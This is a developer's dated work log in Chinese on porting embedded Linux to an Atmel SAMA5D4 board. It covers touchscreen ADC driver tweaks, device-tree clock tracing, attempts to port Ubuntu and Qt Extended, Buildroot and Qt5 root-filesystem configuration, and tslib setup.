		at91_adc_writel(st, st->registers->trigger_register, 0);
		at91_adc_writel(st, AT91_ADC_IDR, AT91_ADC_IER_NOPEN |
			ts_data_irq_mask);
		at91_adc_writel(st, AT91_ADC_IER, AT91_ADC_IER_PEN);

		//by william	
		input_report_abs(st->ts_input, ABS_PRESSURE, 0);	//report BRN_TOUCH 0 之前,多加一步 report pres 0

		input_report_key(st->ts_input, BTN_TOUCH, 0);
		input_sync(st->ts_input);
	} 

使用一个节衷的方法解决了触摸屏的跳屏问题!!!
观察到,触摸屏的第一次采样几乎是正确的!!! 而第一次采样是 采样开关开始后的第一次采样!!!
于是,我们可以频繁打开关闭采样开关,只为取第一次采样,于是 at91_adc.c 修改如下:
at91_adc.c:at91_ts_sample()
........
	/* calculate the pressure */
	reg = at91_adc_readl(st, AT91_ADC_TSPRESSR);

	//by william
	at91_adc_writel(st, AT91_ADC_IDR, (AT91_ADC_IER_XRDY |AT91_ADC_IER_YRDY | AT91_ADC_IER_PRDY));
.......
	//by william
	//ndelay(10000);
	at91_adc_readl(st, AT91_ADC_TSXPOSR);	//清空x y pres寄存器!!
	at91_adc_readl(st, AT91_ADC_TSYPOSR);
	at91_adc_readl(st, AT91_ADC_TSPRESSR);				
	at91_adc_writel(st, AT91_ADC_IER, (AT91_ADC_IER_XRDY |AT91_ADC_IER_YRDY | AT91_ADC_IER_PRDY));

	return 0;
}
从中还挖出几个重点!!!
1,irq pen_detect后会修改 中断触发开关,先关闭pen_detect 并开启开启开关
2,当 累计 x,y,pres 3个采样都就绪时,才在at91_ts_sample 一次性读出采样!!
3,当第一次采样完成后会,把采样结果放到对应寄存器,触发中断,然后不管中断函数中什么时候读取采样结果,就已经开始下一次采样了
  如果第二次采样也结束了,但第一次采样结果还没有读出,第二次的结果并不会写入寄存器,第三次采样不会开始,
  也就说,第一次结果被读出,第二次的结果就可以马上写入寄存器,然后开始第三次采样!!!
4,所以以上改动中,清空x y pres 寄存器操作非常重要!!!
5,虽然我们在读取第一次结果前(或者后) 关闭采样开关,但是已经无法停下已经执行的第二次采样!!,
  第二次采样的结果会在在第一次的结果被读出后迅速刷入寄存器,第二次结果是错误的,
  关闭采样开关,虽然不能阻止第二次结果刷入寄存器,但不会诱发第二次采样完成的中断函数!!!
  这时的寄存器是放置了数据的!!
6,假如我们你清空寄存器,就打开采样开关,硬件因为检测到寄存器有数据,并不开始重新采样便触发了中断,让用户读出上次未读出的错误数据
7,如果先清空了寄存器再 打开采样开关,这样,硬件就会重新采样,再写入寄存器!!
  儿这次采样就是正确率较高的 打开采样后的第一次采样!!!!
最后,
跳屏现象很有规律, 是跳屏采样点在 实际采样点与原点的线性关系上的点!!
认识到,跳屏,可能真的是由于采样频率过密而诱发的电压跳变误差造成!!!
所以,正途是重新修改 adc_clk 等一系列采样时间参数!!

此外,当采样数据送到 寄存器时, ISR对应位会起flag,读取ISR清flag!!
读取ISR清flag后如果没有及时读出 寄存器里的采样数据, 寄存器里的采样数据并不会丢失,而ISR对应位会重新起flag!!
这样就可以同时筹齐 x y pres 三个采样flag后,再一次性 ts_sample 读取三个寄存器的数据!!!

调节采样时间!!!!!!
	ADC_TRGR TRGPER: Trigger Period : 
		AT91_ADC_TRGR_TRGPER_(x)	((x) << 16)
		AT91_ADC_TRGR_TRGPER_(st->ts_sample_period_val)
		Trigger Period = (TRGPER + 1) / ADCCLK
		st->ts_sample_period_val = round_up((TOUCH_SAMPLE_PERIOD_US * adc_clk_khz / 1000) - 1, 1);
		adc_clk_khz = adc_clk / 1000
	ADC_TSMR:
		TSAV: Touchscreen Average 3: AVG8CONV : Averages 8 ADC conversions
		PENDBC: Pen Detect Debouncing Period
			Debouncing period = (2^PENDBC) / ADCCLK periods.
			st->ts_pendbc = round_up(TOUCH_PEN_DETECT_DEBOUNCE_US * adc_clk_khz / 1000, 1);
			adc_clk_khz = adc_clk / 1000











20170209
尝试修改 adc 的时钟来得到处理采样问题!!
追踪修改 adc_clk !!
sama5d4.dtsi
	periph32ck {
		compatible = "atmel,at91sam9x5-clk-peripheral";
		.....
		adc_clk: adc_clk {
			#clock-cells = <0>;
			reg = <44>;
		};

drivers/clk/at91/pmc.c:346:		.compatible = "atmel,at91sam9x5-clk-peripheral",
	........
	{
		.compatible = "atmel,at91sam9x5-clk-peripheral",
		.data = of_at91sam9x5_clk_periph_setup,
	},

drivers/clk/at91/clk-peripheral.c:414:void __init of_at91sam9x5_clk_periph_setup(struct device_node *np,
void __init of_at91sam9x5_clk_periph_setup(struct device_node *np,
					   struct at91_pmc *pmc)
{
	of_at91_clk_periph_setup(np, pmc, PERIPHERAL_AT91SAM9X5);
}
of_at91_clk_periph_setup(np, pmc, PERIPHERAL_AT91SAM9X5);
	for_each_child_of_node(np, periphclknp) {
		of_property_read_u32(periphclknp, "reg", &id)
		...
...跟丢了
但是后来发现 dts 的 adc_clk 与 at91_adc.c里的 st->adc_clk 不是同一回事,
而 dts 的 adc_op_clk 与 at91_adc.c里的 st->adc_clk 才是同一回事,
at91_adc.c: at91_adc_probe()
	mstrclk = clk_get_rate(st->clk);
	adc_clk = clk_get_rate(st->adc_clk);
	adc_clk_khz = adc_clk / 1000;

第二种改法
本来
mstrclk = 100000000
adc_clk = 1000000
adc_clk_hhz = 1000
当改成 
mstrclk = 1000000
adc_clk = 1000000
adc_clk_hhz = 1000
居然采样也正常采样了,但是采样的时间周期太长,因为mstrclk太小!!!!

本来
tsmr:TRGPER = 1999
改为 2499 ,没用!!
改成 2999 ,没用!!
改成 999, 更加没戏!!

本来
tsmr:TRACKTIM = 10
改为 15 ,没用!!
改成 20 ,没用!!

本来
tsmr:TSFREQ: = 3
改为 5 ,成功!!!!!!!!!
改成 4 ,没用!!

并没有设置 TSSCTIM:

累计使用三个方法改,但是结果都是,触摸的延时严重!!! 
1,频繁开关 采样中断
2,改 mstrclk
3,改 tsmr:TSFREQ

补充,关于 adc clk 的一些知识点!!!!
关于 adc的时钟 有两个
	st->clk = devm_clk_get(&pdev->dev, "adc_clk");
	st->adc_clk = devm_clk_get(&pdev->dev, "adc_op_clk");
st->clk 即 dts 的 adc_clk :
st->adc_clk 即 dts 的 adc_op_clk :
st->clk.rate = mstrclk =100000000
st->adc_clk.rate = adc_clk = 1000000
这两个数据都是从 dts里得到的!!!!
然后我们来看 dts 这里的内容:
/ {
	model = "Atmel SAMA5D4 family SoC";
	compatible = "atmel,sama5d4";
	interrupt-parent = <&aic>;

	ahb {
		compatible = "simple-bus";
		#address-cells = <1>;
		#size-cells = <1>;
		ranges;

		apb {
			compatible = "simple-bus";
			#address-cells = <1>;
			#size-cells = <1>;
			ranges;

			adc0: adc@fc034000 {
				compatible = "atmel,at91sam9x5-adc";
				/* 相当于platform_device 里的 IORESOURCE_MEM 类型 resource */
				reg = <0xfc034000 0x100>;
				/* 相当于platform_device 里的 IORESOURCE_IRQ 类型 resource 这里 */
				interrupts = <44 IRQ_TYPE_LEVEL_HIGH 5>;
				clocks = <&adc_clk>,
					 <&adc_op_clk>;
				clock-names = "adc_clk", "adc_op_clk";
				.........
以上是引用 "adc_clk", "adc_op_clk" 的位置 !!

/ {
	model = "Atmel SAMA5D4 family SoC";
	compatible = "atmel,sama5d4";
	interrupt-parent = <&aic>;
	clocks {
		adc_op_clk: adc_op_clk{
			compatible = "fixed-clock";
			#clock-cells = <0>;
			clock-frequency = <1000000>;
		};
		.........
以上是 "adc_op_clk", 的定义位置 !!
在这里 就已经找到 adc_op_clk 的 参数,即 st->adc_clk.rate = clock-frequency = 1000000

/ {
	model = "Atmel SAMA5D4 family SoC";
	compatible = "atmel,sama5d4";
	interrupt-parent = <&aic>;

	ahb {
		compatible = "simple-bus";
		#address-cells = <1>;
		#size-cells = <1>;
		ranges;

		apb {
			compatible = "simple-bus";
			#address-cells = <1>;
			#size-cells = <1>;
			ranges;

			pmc: pmc@f0018000 {
				compatible = "atmel,sama5d3-pmc", "syscon";
				reg = <0xf0018000 0x120>;
				interrupts = <1 IRQ_TYPE_LEVEL_HIGH 7>;
				interrupt-controller;
				#address-cells = <1>;
				#size-cells = <0>;
				#interrupt-cells = <1>;

				periph32ck {
					compatible = "atmel,at91sam9x5-clk-peripheral";
					#address-cells = <1>;
					#size-cells = <0>;
					clocks = <&h32ck>;

					adc_clk: adc_clk {
						#clock-cells = <0>;
						reg = <44>;	//其实就是 pmc 里的 PID 44
					};
				.........
以上是 "adc_clk", 的定义位置 !!
但是,还没有找到 adc_clk 的 参数 即st->clk.rate 的位置
发现 adc_clk 的clock,又隶属于 &h32ck 节点,则:

/ {
	model = "Atmel SAMA5D4 family SoC";
	compatible = "atmel,sama5d4";
	interrupt-parent = <&aic>;

	ahb {
		compatible = "simple-bus";
		#address-cells = <1>;
		#size-cells = <1>;
		ranges;

		apb {
			compatible = "simple-bus";
			#address-cells = <1>;
			#size-cells = <1>;
			ranges;

			pmc: pmc@f0018000 {
				compatible = "atmel,sama5d3-pmc", "syscon";
				reg = <0xf0018000 0x120>;
				interrupts = <1 IRQ_TYPE_LEVEL_HIGH 7>;
				interrupt-controller;
				#address-cells = <1>;
				#size-cells = <0>;
				#interrupt-cells = <1>;

				h32ck: h32mxck {
					#clock-cells = <0>;
					compatible = "atmel,sama5d4-clk-h32mx";
					clocks = <&mck>;
				};
以上是 "h32ck", 的定义位置 !!上面又说了,它自己的 clock又属于 &mck 则:

/ {
	model = "Atmel SAMA5D4 family SoC";
	compatible = "atmel,sama5d4";
	interrupt-parent = <&aic>;

	ahb {
		compatible = "simple-bus";
		#address-cells = <1>;
		#size-cells = <1>;
		ranges;

		apb {
			compatible = "simple-bus";
			#address-cells = <1>;
			#size-cells = <1>;
			ranges;

			pmc: pmc@f0018000 {
				compatible = "atmel,sama5d3-pmc", "syscon";
				reg = <0xf0018000 0x120>;
				interrupts = <1 IRQ_TYPE_LEVEL_HIGH 7>;
				interrupt-controller;
				#address-cells = <1>;
				#size-cells = <0>;
				#interrupt-cells = <1>;

				mck: masterck {
					compatible = "atmel,at91sam9x5-clk-master";
					#clock-cells = <0>;
					interrupt-parent = <&pmc>;
					interrupts = <AT91_PMC_MCKRDY>;
					clocks = <&clk32k>, <&main>, <&plladiv>, <&utmi>;
					atmel,clk-output-range = <125000000 200000000>;
					atmel,clk-divisors = <1 2 4 3>;
				};
				.......
以上是 "mck", 的定义位置 !!上面又说了,它自己的 clock 需要 <&clk32k>, <&main>, <&plladiv>, <&utmi> 一起参与, 则:
由于我们早知道st->clk.rate = mstrclk =100000000 而参数 100000000 就是 <&main>节点里参数!!

		............
		apb {
			compatible = "simple-bus";
			#address-cells = <1>;
			#size-cells = <1>;
			ranges;

			pmc: pmc@f0018000 {
				compatible = "atmel,sama5d3-pmc", "syscon";
				reg = <0xf0018000 0x120>;
				interrupts = <1 IRQ_TYPE_LEVEL_HIGH 7>;
				interrupt-controller;
				#address-cells = <1>;
				#size-cells = <0>;
				#interrupt-cells = <1>;

				main: mainck {
					compatible = "atmel,at91sam9x5-clk-main";
					#clock-cells = <0>;
					interrupt-parent = <&pmc>;
					interrupts = <AT91_PMC_MOSCSELS>;
					clocks = <&main_rc_osc &main_osc>;
				};
				........
以上是 "main", 的定义位置 !!上面又说了,它自己的 clock需要 <&main_rc_osc &main_osc> 参与,看情况, 则:

		............
		apb {
			compatible = "simple-bus";
			#address-cells = <1>;
			#size-cells = <1>;
			ranges;

			pmc: pmc@f0018000 {
				compatible = "atmel,sama5d3-pmc", "syscon";
				reg = <0xf0018000 0x120>;
				interrupts = <1 IRQ_TYPE_LEVEL_HIGH 7>;
				interrupt-controller;
				#address-cells = <1>;
				#size-cells = <0>;
				#interrupt-cells = <1>;

				main_rc_osc: main_rc_osc {
					compatible = "atmel,at91sam9x5-clk-main-rc-osc";
					#clock-cells = <0>;
					interrupt-parent = <&pmc>;
					interrupts = <AT91_PMC_MOSCRCS>;
					clock-frequency = <12000000>;
					clock-accuracy = <100000000>;
				};

				main_osc: main_osc {
					compatible = "atmel,at91rm9200-clk-main-osc";
					#clock-cells = <0>;
					interrupt-parent = <&pmc>;
					interrupts = <AT91_PMC_MOSCS>;
					clocks = <&main_xtal>;
				};
以上是 "main_rc_osc"和 "main_osc", 的定义位置 !!上面又说了,最终其实就是 main_rc_osc节点里的, 就不讨论main_osc 了
main_rc_osc 就是 "adc_clk" clock的最终使用参数的所在地!!
clock-frequency = <12000000>;	表示输入供main_rc_osc使用的clock频率 单位hz
clock-accuracy = <100000000>;	表示main_rc_osc 输出的clock频率 单位hz
而在这里 就已经找到 adc_clk 的 参数,即 st->adc_clk.rate = clock-accuracy = 100000000

触摸屏幕校对 ts_calibrate 只要多校对几次就好了!!









20170210
移植 window-manager 和 软键盘
软键盘 首选 syszuxpinyin 然而只是下载了源码,大概搜集了做法,却未实现
window-manager 先选 X-window 但是网上移植的教程不多
最后想到,还不如做 移植一个 ubuntu 的文件系统,里面就附带 window-manager
于是开始移植 ubuntu 文件系统!!
几经波折,居然勉强把ubuntu15 的文件系统给挂上!!!,但是容易死机,特便是 cloud-init什么初始化失败,login 时就死机!!
以下是一些移植 ubuntu 文件系统的 参考网页
https://www.ibm.com/developerworks/linux/tutorials/l-ubuntu/
http://blog.csdn.net/embbnux/article/details/12751465
http://www.arm9home.net/read.php?tid-81429.html
http://blog.csdn.net/kickxxx/article/details/15341079
http://cdimage.ubuntu.com/ubuntu-core/vivid/daily-preinstalled/20170104/
https://www.embbnux.com/category/embedded_linux/
http://cdimage.ubuntu.com/ubuntu-base/releases/12.04.4/release/









20170215
内核启动后,挂载根文件系统后的初始化有两种方式
1,传统的 System V initialization 需要先查询 /etc/inittab 文件, 
  init进程启动后第一时间找的就是inittab 文件！inittab负责初始化系统，设置系统runlevel及进 入各runlevel对应要执行的命令。
  假设当前inittab中设置的默认runlevle是5，则init会运行/etc/init.d/rc 5命令，该命令会依据系统服务的依赖关系遍历执行/etc/rc5.d中的脚本/程序。
  进入/etc/rc5.d目录可以发现里面的文件都是到/etc /init.d/下对应的脚本/程序的软链接。
  以S开头的为启动的意思，以K开头的为停止。并且S/K后面的两位数数字代表了服务的启动顺序（由服务依赖关系决定）
  传统的 System V initialization 是以 runlevel 为核心的,依据服务依赖关系初始化
  传统的 System V initialization 一般包含的主要文件有
  /etc/inittab
  /etc/init.d
  /etc/rc0.d
  /etc/rc1.d
  /etc/rc2.d
  /etc/rc3.d
  /etc/rc4.d
  /etc/rc5.d
  /etc/rc6.d
  /etc/rcS.d
2,新的方式是 Upstart job 模式!!
  就是事件驱动,才初始化启动对应的服务功能,严格上说只使用到 /etc/init 里的文件!!
  Upstart job 模式 把 分配 runlevel 也当做是一种事件!!
然而, ubuntu 使用的是合拼型的启动方式!!
ubuntu 的 /etc/init 有以下几个重点文件!!
rc.conf			//rc-sysinit在startup事件发生时被启动
rc-sysinit.conf		//rc在系统runlevel变化时被启动
rcS.conf		//rcS在系统runlevel为S时启动
ubuntu使用的合拼启动模式是,把 System V initialization 的后动当做是一个事件, 用Upstart init 来启动这个事件
在配置文件的注释中说明了，这几个文件，正是Upstart init处理System V-style服务的关键。
文件系统挂载后,startup 启动,然后启动 rc-sysinit.conf ,设置runlevel,然后转到 rc.conf 执行:
exec /etc/init.d/rc $RUNLEVEL  转到了对应的 /etc/rcx.d 开始对应内容的执行!! 即转到了 System V initialization 的内容!!

网上参考:(ubuntu初始化)
启动时会首先执行/etc/init目录中配置文件
配置文件中可以设置启动的时机与顺序，start on startup,start on runlevel [1234],stop on [!3453]
一般的Linux分8个级别:0-6和一个'S'级别。
	0代表关机(halt)，
	6代表重启(restart)；
	1-5分别是不同功能的级别，其中1级别是单用户模式(single)，2-5各有不同。但是在userlinux(包括ubuntu)中2-5级别是毫无差别的。
	最后'S'级别是一个比较特殊的级别，他应该是先于其他级别运行的级别。(这一点有待考证)。
	这里说明一下，0-6级别的运行是互斥的，而不是叠加运行，
	也就是说如果进入(move into)4级别，不是指0-3都要运行，而只是完成4级别里所规定的服务。
所有的运行服务的脚本存储在/etc/init.d/里面。而在/etc/中有rc'X'.d的文件夹，'X'代表0-6和S，也就对应了这8个启动级别，
	里面就都是指向/etc/init.d/里面运行服务的脚本的软连接(symbol link)，
会发现，软连接的数目少于运行脚本数，这就是说不是所有服务都要在一个级别中运行的。软连接的命名是有规则的：
	[K|S][0-90-9][name]，K代表kill，S代表start，后面是个二位数，最后是对应的运行服务的脚本文件名。
	这个name是在运行相应的脚本的时候传递的参数，
	K是传递stop(就是关闭服务),S是传递start(就是启动服务)，
	运行顺序：K小数->K大数->S小数->S大数。这里注意文件夹里的所有软连接都会被执行，
rc'x'.d里面的软连接是由/etc/init/rc.conf调用的 ("x"不包括S)
rcS.d里面的软连接是由/etc/init/rc.conf调用的
rcS.conf		//rcS在系统runlevel为S时启动
在ubuntu中，可以使用update-rc.d命令去维护rc，语法为：sudo update-rc.d servicename defaults 

然而发现 ubuntu12 符合以上ubuntu启动方式, 不可以启动,但是 ubuntu15不符合以上方式,不可启动!!

嵌入式桌面系统架构; gnome 和 kde 而真正的gui是建立在这些架构上的软件!!

简单的嵌入式桌面系统 qt-extended (旧时代手机桌面,已不再维护)
重点记录!!!
在configure时!!出错!!
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/qt-extended/qte1/build-pc$ echo yes | ../qt-extended-4.4.3/configure -ui-type home -release -clean -sound-system alsa -build-qt -no-sxe -no-ssl -no-v4l2 -no-vpn -no-phonon -no-libamr -mediaengines cruxus -remove-mediaengine gstreamer,helix -pictureflow -remove-module bluetooth,drm -no-dbus -no-dbusipc -add-displaysize 480x272 -extra-qt-embedded-config "-qt-freetype -no-webkit -no-dbus -qt-gfx-transformed -qt-gfx-linuxfb" -extra-qt-config "-no-webkit" 
/* log start */
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = "”en_US”",
	LC_ALL = (unset),
	LC_CTYPE = "”en_US”",
	LANG = "”en_US”"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = "”en_US”",
	LC_ALL = (unset),
	LC_CTYPE = "”en_US”",
	LANG = "”en_US”"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").

This is the Qt Extended Open Source Edition.

You are licensed to use this software under the terms of the GPL.
Please see the file LICENSE.GPL for the licensing terms.

Type 'yes' to accept this license offer.
Type 'no' to decline this license offer.

Do you accept this license agreement? 
Testing the system Qt: OK (bootstrap only)
Found Qt 4.8 while expecting Qt 4.4.
Qt Extended will build Qt from source.
Qt Extended is using the following locations:
Qt          SOURCE tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/qt-extended-4.4.3/qtopiacore/qt
Qt          BUILD  tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/build-pc/qtopiacore/host
Qt Embedded SOURCE tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/qt-extended-4.4.3/qtopiacore/qt
Qt Embedded BUILD  tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/build-pc/qtopiacore/target
Qt Extended SOURCE tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/qt-extended-4.4.3
Qt Extended BUILD  tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/build-pc
Qt Extended SDK    tree = /home/infortech-ubuntu-1404/SAMA5D4/sources/qt-extended/qte1/build-pc/sdk

Checking the compiler (host): OK (GCC 4, Little Endian)
Checking the compiler (target): OK (GCC 4, Little Endian)
Bootstrap QBuild: .. FAIL
In file included from ../../../qt-extended-4.4.3/qbuild/src/main.cpp:37:0:
../../../qt-extended-4.4.3/qbuild/src/options.h: In constructor 'Options::Options()':
../../../qt-extended-4.4.3/qbuild/src/options.h:52:22: error: call of overloaded 'QString(int)' is ambiguous  //错误处
           traceFile(0) {}
                      ^
../../../qt-extended-4.4.3/qbuild/src/options.h:52:22: note: candidates are:
In file included from /usr/include/qt4/QtCore/QString:1:0,
                 from ../../../qt-extended-4.4.3/qbuild/src/qfastdir.h:23,
                 from ../../../qt-extended-4.4.3/qbuild/src/main.cpp:21:
/usr/include/qt4/QtCore/qstring.h:421:43: note: QString::QString(const QByteArray&)
     inline QT_ASCII_CAST_WARN_CONSTRUCTOR QString(const QByteArray &a)
                                           ^
/usr/include/qt4/QtCore/qstring.h:419:43: note: QString::QString(const char*)
     inline QT_ASCII_CAST_WARN_CONSTRUCTOR QString(const char *ch) : d(fromAscii_helper(ch))
                                           ^
/usr/include/qt4/QtCore/qstring.h:725:8: note: QString::QString(const QString&)
 inline QString::QString(const QString &other) : d(other.d)
        ^
/usr/include/qt4/QtCore/qstring.h:89:5: note: QString::QString(QChar)
     QString(QChar c);
     ^
/usr/include/qt4/QtCore/qstring.h:88:14: note: QString::QString(const QChar*)
     explicit QString(const QChar *unicode); // Qt5: merge with the above
              ^
../../../qt-extended-4.4.3/qbuild/src/main.cpp: In function 'void createProject()':
../../../qt-extended-4.4.3/qbuild/src/main.cpp:49:33: warning: ignoring return value of 'int chdir(const char*)', declared with attribute warn_unused_result [-Wunused-result]
         ::chdir(pwd.constData());
                                 ^
make[1]: *** [main.o] Error 1
/* log end */
初步认为是冲突了 网上都说要把 QT creator 删掉, 实际上不止,应该把不知道什么时候装在pc上的qt4删掉或暂时屏蔽掉路径
还是失败,原来还是需要寻找QT库的,但是显然qt-extended4.4.3与pc机上的qt库版本冲突了!!
(所以搁置 qt-etended 的移植!!)

移植 minigui
(待续)










20170216
架设 ssh 登陆 远程电脑:
安装
	sudo apt-get install openssh-client
	sudo apt-get install openssh-server
启动ssh服务：
	sudo /etc/init.d/ssh start
停止ssh服务：
	sudo /etc/init.d/ssh stop
重启ssh服务：
	sudo /etc/init.d/ssh restart
然后确认sshserver是否启动了：（或用“netstat -tlp”命令)
	ps -e | grep ssh


申请免费域名并挂到路由器DNS
暴露pc主机的dmz 到公网
设置端口转送
ssh配置:
ssh -NfR 2284:localhost:22 infortechubuntu1404-HP-EliteDesk-880-G2-TWR@16r6d01795.iask.in  // ??反向代理
ssh -gNfR *:2222:localhost:22 root@16r6d01795.iask.in	//  ??或这样设置?
(未成功)!!









20170217
重新尝试 buildroot,事实上,发现,buildroot更适合,构造根文件系统和arm-gcc,g++ 编译工具!!
不推荐使用提供的sh脚本来烧录镜像!!因为,有很多与之前研究中不一样的配置和操作!!所以推荐手动烧录文件系统镜像到机器
编译记录:
使用之前 git clone 下来的 buildroot 即 buildroot1
先 make distclean
然后 make atmel_sama5d4_xplained_mmc_defconfig	做初步配置
然后 make menuconfig 修改配置!!!
	Target option 里的 默认不变
	Build option 里的 蓦然不变
	System configuration 里的 默认不变
	kernel 取消不选
	bootloader 取消不选
	Target package 根文件系统里预装的内容
		添加QT5的图形库!!
		Graphic libraries and applications (graphic/text)  --->  ->  [*] Qt5  --->
		--- Qt5       
		-*-   qt5base            
		[ ]     Approve free license    
		()      Config file         
		[*]     Compile and install examples (with code) 	//一定要examples 检验图像库是否移植成功!!
		[ ]     concurrent module       
		[ ]     MySQL Plugin          
		[ ]     PostgreSQL Plugin              
			SQLite 3 support (No sqlite support)  ---> 
		[*]     gui module            
		[*]       widgets module             
			  *** OpenGL support needs an OpenGL-capable backend ***  
		-*-       linuxfb support            
		          *** directfb backend available if directfb is enabled ***    
		          *** X.org XCB backend available if X.org is enabled ***   
			  *** eglfs backend available if OpenGL and EGL are enabled ***    
		(linuxfb) Default graphical platform  
		[*]       fontconfig support    
		[*]       GIF support            
		[*]       JPEG support          
		[*]       PNG support           
		[*]     DBus module             
		[*]     Enable ICU support       
		[*]     Enable Tslib support  
		......
	Filesystem images 根文件系统的镜像格式选取!!
		在这里我们要添加ubi选项,让根文件系统添加这个格式的镜像
		[*] ubifs root filesystem
		(0x3e000) logical eraseblock size	//逻辑擦除块大小 248kiB
		(0x1000) minimum I/O unit size 		//page的大小 4kiB
		(2082) maximum logical eraseblock count  //逻辑擦除块数量
		ubifs runtime compression (lzo)  ---> 	 //压缩格式 lzo
		Compression method (no compression)  ---> 
		()    Additional mkfs.ubifs options  
		[*]   Embed into an UBI image    	//生成 .ubi镜像
		(0x40000) physical eraseblock size  	//物理块大小 256kiB
		(4096)  sub-page size             	//page的大小 4kiB
	Toolchain  编译工具链,其实就是整套 arn-linux-gcc 工具链,
		注意,一定要把里面的功能全部使能,不然得到的 的工具链功能是有缺陷的,而且中途不能通过重新编译添加未添加的功能,
		只能把整套删掉 make distclean 然后再重新生成一整套!!
		我们这次用到的工具链的版本配置信息!!!
		Toolchain type (Buildroot toolchain)  ---> //使用Buildroot toolchain 即,自动下载gcc工具链源码包编译
							   //而 External toolchain 就是说使用已有的,用户现成的 gcc 工具包,即不用重新编译
		 *** Toolchain Buildroot Options ***		
	(buildroot) custom toolchain vendor name
		C library (glibc)  --->			   //这套gcc工具 使用 glibc库
		*** Kernel Header Options *** 
		Kernel Headers (Linux 4.1.x kernel headers)  ---> //是说明这套gcc是专门面向kernel4.1?
								  //还是说这套gcc是拥有kernel4,1的特征?? 
		glibc version (2.23)  ---> 		  //这套gcc工具 使用的 glibc库 版本!!
		*** Binutils Options ***
		Binutils Version (binutils 2.26.1)  --->  //这套gcc工具 使用的 binutils 版本!!
	    ()  Additional binutils options 
		*** GCC Options ***
		GCC compiler Version (gcc 4.8.x)  --->  
	    ()  Additional gcc options   
	    //添加这套gcc工具 的其他功能,使之成为完整的的一套工具!!!
	    [*] Enable C++ support   			
	    [*] Enable Fortran support 
	    [*] Enable compiler link-time-optimization support       
	    [*] Enable compiler OpenMP support    
	    [*] Enable libmudflap support 
	    [*] Enable graphite support  
		*** Host GDB Options ***  
	    [*] Build cross gdb for the host  
	    [*]   TUI support 
	    [*]   Python support     
	    [*]   Simulator support 
		  GDB debugger Version (gdb 7.10.x)  --->   
		*** Toolchain Generic Options *** 
	    [ ] Copy gconv libraries  
	    [*] Enable MMU support  
	    ()  Target Optimizations  
	    ()  Target linker options  
	    [ ] Register toolchain within Eclipse Buildroot plug-in                                                            │ │  

配置完就 make -j8 进行编译
	再次注意:如果 本来的toolchain里不包含Enable C++ support 那么得到的 gcc工具包里就没有 arm-linux-gnueabihf-g++,
	所以当builroot 编译rootfs要加入qt5的内容,会因为中找不到g++来编译cpp文件而出现以下错误,	 
	configure: error: You need a C++ compiler for C++ support  ubuntu
	这时,中途 make menuconfig 重新选上 Enable C++ support ,然后重新 make -j8并不会让toolchain 自动添加 arm-linux-gnueabihf-g++ 这个工具
	唯一办法是,把toolchain生成的全删后,重新 make -j8
编译成功好后:
buildroot/output/build 里是下载下来的函数库或者工具包的源码以及编译后的文件
buildroot/output/host/usr 里的是 生成的一整套完整 arm-linux-gcc 工具链, 可以直接拷出来自己使用!!
buildroot/output/images 里的是生成的镜像文件!!! 由于我们只使用buildroot构造文件系统,所以只有 rootfs相关的各个镜像,并没有zImage等其他镜像
buildroot/output/target 未打包成镜像前的根文件目录的内容!!
烧录:
cd到images
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x800000:0x1f800000 -c write:rootfs.ubi:0x800000
开机,成功加载系统!!!
测试ts_test,ts_calibrate, qt-example 成功!!
但是,qt-example的的触摸屏按键 依然出现 翻转错位现象
此外文件系统加载时,并没有自动初始化网络:
使用命令:
udhcpc 初始化网络!!
此外,想知道,qt程序是如何运用tslib的,所以希望查找 /etc/profile文件来查看qt配置!!
什么也没有发现!!
没有 TSLIB_**, QT_QPA_** 一类环境变量,grep搜索,没发现相关的配置文件,
却发现在内嵌在 libqt***.so.65.6.2XXX 之类的库文件里!! 
检查 tslib 与 qt图形库的关系,发现 qt图形库直接使用event0 压根没有使用tslib!!!
但是 grep 发现 qtbase 编译前的configure 是有添加 -tslib 选项的!!!











20170220
追查qt5.6.2 与 tslib1.1 的联系 
(注意只是从 buildroot 里制作的根文件系统做的实验,未知其他根文件系统会是怎么样!!!)
先把 buildroot生成的 rootfs 文件目录,拷贝到 rootfs3
使用组合命令 编译成 rootfs.ubi 镜像
sudo mkfs.ubifs -r /home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs2/demofs -o demofs.ubifs -e 0x3e000 -c 2082 -m 0x1000 -x lzo
sudo ubinize -o demofs.ubi -m 0x1000 -p 0x40000 ubinize.cfg
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x800000:0x1f800000 -c write:demofs.ubi:0x800000
烧录后,却被告知说 不能打开 /dev/console permittion denyed  
经过一番折腾发现,buildroot 生成的 rootfs 目录全部文件都被赋予了只读权限,
因此在 生成ubi镜像前,先把文件的所有权限开放
sudo chmod 777 rootfs/*			//  开发所有文件的权限 */
然后烧录运行正常!!
关于QT触摸屏错位的改正!!
直接怀疑 QT库并没有使用 tslib !!
发现profile内容没有 常规移植QT和tslib时要添加的 路径变量,所以怀疑 tslib 和 QT 一直在使用默认环境变量!!
于是 profile 末尾加上一项
export QT_QPA_GENERIC_PLUGINS=tslib
//注意,不是 export QT_QPA_GENERIC_PLUGINS=tslib:/dev/input/event0
// :号 表示,要么使用tslib修正过的触摸屏设备,要么直接使用原生触摸屏设备
//为了避免 QT5 可能直接使用原生设备, 所以不要加入/dev/input/event0!!!!
执行 QT5 examples/widgets/desktop/screenshot 里的例程时,出现了 ts_open() faired with error (no such file or dictionary ) 
执行 QT5 examples/widgets/touch/fingerpaint 里的例程时,也出现了 ts_open() faired with error (no such file or dictionary ) 
这时因为要使用tslib修正过的触摸屏设备,就得使用tslib的 api ts_open
而 ts_open 要打开原生触摸屏设备,但是我们没有给出 这个设备的环境变量,所以要在 profile 加上
